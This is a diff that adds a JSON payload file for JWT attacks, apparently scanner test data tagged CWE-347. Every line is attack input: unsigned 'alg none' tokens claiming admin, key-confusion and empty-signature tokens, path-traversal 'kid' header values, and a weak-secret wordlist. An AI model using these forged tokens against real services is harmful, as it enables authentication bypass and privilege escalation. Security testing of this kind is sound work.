@@ -1,0 +1,15 @@
+{
+  "variants": {
+    "alg_none": ["eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.", "eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0.", "eyJhbGciOiJOb25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0."],
+    "key_confusion": ["eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c", "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIn0.c2lnbmF0dXJlX3dpdGhfSFMyNTY="],
+    "null_sig": ["eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIn0.", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0."],
+    "kid_injection": ["{\"alg\":\"HS256\",\"kid\":\"../../../../../../dev/null\"}", "{\"alg\":\"HS256\",\"kid\":\"key.php\"}", "{\"alg\":\"HS256\",\"kid\":\"/dev/null\"}"],
+    "weak_secret": ["secret", "password", "123456", "admin", "key", "jwt-secret", "changeit", "token", "default", "test"]
+  },
+  "payloads": ["eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ."],
+  "markers": ["invalid signature", "jwt malformed", "signature verification failed", "jwt expired", "invalid token"],
+  "metadata": {
+    "cwe": "CWE-347",
+    "technique": "JWT attacks"
+  }
+}
